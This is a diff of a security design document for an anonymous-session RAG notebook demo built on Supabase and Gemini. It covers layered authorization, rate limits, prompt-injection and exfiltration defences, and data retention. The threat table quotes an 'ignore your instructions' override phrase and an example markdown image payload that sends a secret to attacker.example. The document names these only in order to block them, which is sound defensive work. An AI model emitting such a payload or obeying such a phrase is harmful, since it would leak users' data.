@@ -24,14 +24,16 @@ Anything crossing from left to right is validated. Model output is treated as un
 - Every visitor gets an **anonymous Supabase session**. Sign-in is protected by **Cloudflare Turnstile** (Supabase Auth's built-in CAPTCHA support) in *managed/invisible* mode, so reviewers normally see no challenge.
 - The CAPTCHA token is passed to `signInAnonymously({ options: { captchaToken } })`. The secret key lives only in the Supabase dashboard — never in the repo or the client.
 - Anonymous users are the `authenticated` role in Postgres. RLS policies apply to them unchanged — do not write special cases based on `is_anonymous`.
+- The demo password (`/demo-login`) buys an **entitlement**, not just a cookie: a `demo_entitlements` row for the session, which the demo policies and `notebooks_insert_owner` require. Both expire after 8 h. A phone-number-like throttle on the login route is *not* claimed — see §7.
 - Middleware only refreshes sessions. **Authorization never happens in middleware alone.**
 
 ## 3. Authorization — defense in depth
 
-Two layers, both required:
+Three layers, all required:
 
 1. **RLS** on every table and storage bucket (`database.md`). This is the layer that must never fail.
 2. **Explicit checks in every server action and route handler:** get the user from the server client, load the target row *through the user-scoped client*, and fail with 404 (not 403 — don't confirm existence) if it isn't theirs.
+3. **Binding checks in Postgres for any reachable API.** `proxy.ts` only sees requests to the Next app; PostgREST is a different origin, so anything a client can do with the anon key directly (the demo reading, notebook creation) must be gated by a database-side check, not by the app that happens to be the usual caller. Two precedents: D-17's notebook-limit trigger and D-21's `is_demo_entitled()`.
 
 **Server actions are public HTTP endpoints.** Anyone can call them with any arguments, not just our UI. Every action validates its input and checks ownership, even if "the button is only shown to the owner".
 
@@ -62,7 +64,7 @@ Based on the OWASP Top 10 for LLM Applications, narrowed to what applies here.
 
 | Risk | Rule |
 |---|---|
-| **Prompt injection** (a source says "ignore your instructions…") | Instructions and untrusted content are strictly separated: system rules first, then clearly delimited context blocks, then the question. The system prompt states that context is data. The model has **no tools** and triggers **no actions** — worst case is a wrong answer, never a wrong action. |
+| **Prompt injection** (a source says "ignore your instructions…") | Instructions and untrusted content are strictly separated: system rules first, then clearly delimited context blocks, then the question. The system prompt states that context is data, and the delimiter is one a document cannot move: any delimiter token inside retrieved content or a source title is neutralised when the prompt is assembled (`lib/chat/prompts.ts`). The model has **no tools** and triggers **no actions** — worst case is a wrong answer, never a wrong action. |
 | **Data exfiltration via rendered output** | Model output is rendered as Markdown **without raw HTML and without images**. Links are allowed only for `http(s)`, open with `rel="noopener noreferrer nofollow"`. (An injected source could make the model emit `![](https://attacker.example/?q=<secret>)`; the browser would fetch it silently.) CSP `img-src` backs this up. |
 | **Cross-user leakage** | Retrieval always filters by `notebook_id` *and* runs through RLS (`security invoker`). A prompt only ever contains chunks the current user may read. |
 | **Unverified citations** | Citations are validated server-side against the chunks actually retrieved; invalid ones are dropped, never displayed. |
@@ -78,6 +80,10 @@ Per-user limits alone are not enough: clearing cookies creates a new anonymous u
 3. **Global daily AI cap** (`AI_GLOBAL_DAILY_CAP`): a circuit breaker counted across all users in `usage_events`. When reached, AI features return a friendly "daily demo limit reached" message until midnight UTC. This protects the free Gemini quota during the review window.
 
 Every AI-calling route or action checks all applicable limits **before** calling the model.
+
+Residual risk: per-user limits reset for anyone willing to clear cookies and pass Turnstile again, so (1)+(2) alone don't stop a determined single visitor from consuming a disproportionate share of the daily quota before (3) trips for everyone. Accepted for the demo since (3) still bounds total spend; a future guard worth considering is a coarser per-IP or per-fingerprint limit ahead of the global cap.
+
+**The login limiter is a stopgap, deliberately.** `lib/demo-login-rate-limit.ts` is an in-process `Map`: on Vercel it counts per instance, and instances are created and recycled freely, so the real ceiling on password guessing is "attempts × warm instances", not five per window. Accepted rather than fixed: the password is a shared review secret handed out on request, guessing it buys nothing that asking for it does not (D-16), and the damage an entitled visitor can do is already bounded by (2) and (3) above plus the ingest and chat budgets. Making it durable would mean a table, a service-role write on an unauthenticated route, and its own cleanup — for a threat the entitlement is not protecting anything valuable against. Revisit only if the password ever gates something other than the public demo.
 
 ## 8. Server-side fetching (URL sources)
 
@@ -116,6 +122,7 @@ Fetching user-supplied URLs from our server is a classic SSRF vector.
 - Server logs are structured JSON with `requestId`, `userId`, operation, timings and token counts. **Never log** document content, questions, answers, keys or tokens.
 - The Gemini free tier may use submitted content to improve Google's products. The UI shows this notice **before the first upload**; the README repeats it.
 - Collect nothing that isn't needed: no emails, no analytics, no tracking.
+- Anonymous users inactive for `RETENTION_DAYS` (30) are deleted by a daily cron job (`/api/cron/retention`, `CRON_SECRET` bearer): storage objects first, then the auth user (rows cascade). The UI states this in a first-visit banner and the footer.
 
 ---
 
